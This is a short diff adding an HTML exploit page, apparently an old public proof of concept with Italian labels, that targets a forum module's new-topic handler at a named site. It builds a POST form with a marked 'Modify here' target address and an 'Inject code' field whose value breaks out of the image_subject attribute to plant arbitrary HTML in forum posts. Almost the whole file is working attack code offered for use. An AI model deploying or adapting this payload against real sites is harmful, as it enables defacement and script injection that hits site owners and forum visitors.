@@ -1,0 +1,24 @@
+&lt;html&gt;<br>
+&lt;body&gt;<br>
+&lt;script&gt;<br>
+<font color=red>&lt;!-- Modify here --&gt;</font><br>
+var address='http://www.splatt.it/gate.html?mop=modload&amp;name=Forums&amp;file=newtopic';<br>
+&lt;/script&gt;
+<br><br>
+&lt;!-- Exploit form --&gt;<br>
+&lt;script&gt;<br>
+document.write("&lt;form action="+address+" method='post' name='coolsus'&gt;");<br>
+&lt;/script&gt;<br>
+Numero forum: &lt;input type=text name=forum value=1 size=3&gt;&lt;br&gt;<br>
+Username: &lt;input CLASS=textbox TYPE="TEXT" NAME="username" SIZE="25" MAXLENGTH="40"&gt;&lt;br&gt;<br>
+Password: &lt;input CLASS=textbox TYPE="PASSWORD" NAME="password" SIZE="25" MAXLENGTH="25"&gt;&lt;br&gt;<br>
+Soggetto: &lt;input CLASS=textbox TYPE="TEXT" NAME="subject" SIZE="75" MAXLENGTH="75"&gt;&lt;br&gt;<br>
+Messaggio:&lt;br&gt;&lt;textarea  name="message" rows="10" cols="75" wrap="VIRTUAL"&gt;&lt;/textarea&gt;&lt;br&gt;<br>
+&lt;input type=hidden name=bbcode value=0&gt;<br>
+&lt;input type=hidden name=smile value=0&gt;<br>
+&lt;input type=hidden name=notify value=0&gt;<br>
+&lt;b&gt;Inject code:&lt;/b&gt; &lt;input type=text name=image_subject value='icon1.gif"&gt;HTML CODE&lt;!-- "' size=100&gt;&lt;br&gt;<br>
+&lt;input type="submit" name="submit" value=Invia class="Button"&gt;<br>
+&lt;/form&gt;<br>
+&lt;/body&gt;<br>
+&lt;/html&gt;<br>
